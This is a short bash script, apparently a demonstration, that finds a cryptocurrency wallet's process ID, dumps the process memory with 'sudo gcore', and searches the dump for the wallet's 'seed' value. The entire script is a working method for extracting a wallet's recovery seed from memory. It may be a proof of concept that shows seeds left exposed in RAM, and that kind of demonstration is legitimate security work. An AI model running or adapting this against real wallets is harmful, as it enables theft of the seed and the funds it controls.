#!/bin/bash

if [ $(uname) != "Linux" ] ; then
    echo "this script works only on Linux"
    exit
fi

if [ $# == 0 ] ; then
    user=''
    wallet=charile
elif [ $# == 1 ] ; then
    user=''
    wallet=$1
elif [ $# == 2 ] ; then
    user=$1
    wallet=$2
else
    echo "usage: "$0" [[username] walletname] (e.g. demo0 charlie)"
    exit
fi
echo "wallet="$wallet

echo ""
echo "************** CHARLIE'S WALLET PROCESS ID ******************"
echo ""
pid=$(./wallet-pid.py $user $wallet)
echo "Wallet Process ID:"$pid
echo ""
echo "************** CHARLIE'S WALLET MEMORY DUMP *****************"
echo ""
sudo gcore $pid
strings core.$pid | grep \"seed\"
echo ""
